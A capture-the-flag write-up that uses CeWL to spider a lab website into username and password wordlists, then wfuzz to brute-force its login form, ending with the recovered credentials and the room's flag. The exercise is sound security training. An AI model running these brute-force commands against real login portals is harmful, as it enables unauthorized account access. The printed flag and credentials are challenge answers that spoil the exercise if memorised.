# Brute Forcing

We'll be learnig how to use the CeWL custom wordd generator that spiders websites to create word lists based on the site's content. Spidering, in the context of web security and penetration testing, refers to the process of automatically navigating and cataloguing a website's content, often to retrieve the site structure, content, and other relevant details. The additional built in functions in this tool are of great help and as it is actively maintained, it stays relevant. 
What we're looking for is a username and password which we use to login in to the website and fetch the flag. You may know that most users while creating a password generally tend to resort to their names or DOB as passwords. This can be a vague way to try explaining what we'll be doing in the challenge as we'll be using the data avaialable on the website to find the correct username and password combination. We'll create two files storing the usernames and passwords.
On giving a random input, the error message was **"Please enter the correct credentials"**

We'll create a file storing the passwords
- **`cewl -d 2 -m 5 -w passwords.txt http://MACHINE_IP --with-numbers`**

  - **`-d 2`** specfies the tool to spider two links deep
  - **`-m 5`** specifies that the password should be of minimum length 5
  - **`-w passwords.txt`** means to write the output into the **passwords.txt** file
  - **`http://MACHINE_IP`** is our target site
  - **`--with-numbers`** is an extension which appends numbers to words
  On reading out the text file, we can see a whole bunch of possible passwords.

![Screenshot (83)](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/1998da7c-ba7a-492a-bf04-55acac671167)

  Now we'll create the file storing the usernames as
  - **`cewl -d 0 -m 5 -w usernames.txt http://MACHINE_IP/team.php --lowercase`**

    - **`-d 0`** specfies the tool to spider zero links deep
    - **`-m 5`** specifies that the password should be of minimum length 5
    - **`-w usernames.txt`** means to write the output into the **usernames.txt** file
    - **`http://MACHINE_IP`** is our target site
    - **`--lowercase`** is custom extension which stores the output values in lower case

Same as before, on reading out the text file, we can see a whole bunch of possible usernames.

![Screenshot (84)](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/f47f7e23-2e2a-402c-80a9-6ced5134d2f5)

    Now we'll try out these two files in combination on the website login portal using **wfuzz** tool as
- **` wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://MACHINE_IP/login.php -d "username=FUZZ&password=FUZ2Z"`**
  - **`-z file,usernames.txt`** loads the usernames list.
  - **`-z file,passwords.txt`** uses the password list generated by CeWL.
  - **`-hs "Please enter the correct credentials"`** hides responses containing the string "Please enter the correct credentials", which is the message displayed for wrong login attempts.
  - **`-u http://MACHINE_IP/login.php`** specifies the target site.
  - **`-d "username=FUZZ&password=FUZ2Z"`** provides the POST data format where FUZZ will be replaced by usernames and FUZ2Z by passwords.


![Screenshot (85)](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/2710b7bf-562d-465a-bbb9-e22ef3a5e130)

And then we get the password as **`isaias:Happiness`**

On entering these detail in the login portal, we get the flag.

![Screenshot (86)](https://github.com/Wixter07/HARSHITH-JTP-2/assets/150792650/bb4730c2-c8da-4fcc-bd22-1d18ed2f7d65)

**`The flag- THM{m3rrY4nt4rct1crAft$}`**
